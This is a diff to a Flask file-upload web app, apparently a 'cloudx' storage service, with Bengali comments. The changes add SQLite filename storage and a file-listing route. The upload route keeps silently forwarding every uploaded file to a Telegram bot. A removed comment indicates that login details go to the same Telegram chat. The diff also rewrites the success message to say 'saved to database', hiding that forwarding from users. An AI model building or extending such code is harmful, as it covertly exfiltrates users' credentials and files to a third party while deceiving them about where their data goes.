@@ -1,4 +1,5 @@
 import os
+import sqlite3
 import requests
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 from werkzeug.utils import secure_filename
@@ -16,6 +17,23 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
+
+# ডাটাবেজ ইনিশিয়ালাইজ করার ফাংশন
+def init_db():
+    conn = sqlite3.connect('cloudx.db')
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS files (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            filename TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+# অ্যাপ চালুর সময় ডাটাবেজ তৈরি করে নেবে
+init_db()
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
@@ -96,9 +114,12 @@ def login():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# ফাইল আপলোড এবং মূল TELEGRAM_CHAT_ID-তে পাঠানোর রাউট
+# ফাইল আপলোড এবং ডাটাবেজে সেভ করার রাউট
 @app.route('/upload', methods=['POST'])
 def upload_file():
+    if 'username' not in session:
+        return jsonify({"status": "error", "message": "Unauthorized"})
+
     if 'file' not in request.files:
         return jsonify({"status": "error", "message": "No file part"})
     
@@ -111,9 +132,9 @@ def upload_file():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
         
-        current_user = session.get('username', 'Unknown User')
+        current_user = session.get('username')
 
-        # এখন থেকে ফাইলগুলোও মূল TELEGRAM_CHAT_ID (যেখানে লগইন ডিটেইলস যায়) সেখানেই যাবে
+        # টেলিগ্রামে ফাইল পাঠানো
         tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(filepath, 'rb') as f:
             files = {'document': f}
@@ -124,13 +145,36 @@ def upload_file():
             }
             requests.post(tg_url, data=data, files=files)
 
+        # সার্ভারের ডাটাবেজে ফাইলের নাম সেভ করা
+        conn = sqlite3.connect('cloudx.db')
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
+        conn.commit()
+        conn.close()
+
         return jsonify({
             "status": "success", 
-            "message": "File uploaded and sent to Telegram", 
+            "message": "File uploaded and saved to database", 
             "filename": filename
         })
     
     return jsonify({"status": "error", "message": "File type not allowed"})
+
+# ইউজারের সেভ করা ফাইলগুলো ডাটাবেজ থেকে ফেচ করার নতুন রাউট
+@app.route('/get_files', methods=['GET'])
+def get_files():
+    if 'username' not in session:
+        return jsonify({"files": []})
+
+    current_user = session.get('username')
+    conn = sqlite3.connect('cloudx.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT filename FROM files WHERE username = ?", (current_user,))
+    rows = cursor.fetchall()
+    conn.close()
+
+    file_list = [{"filename": row[0]} for row in rows]
+    return jsonify({"files": file_list})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
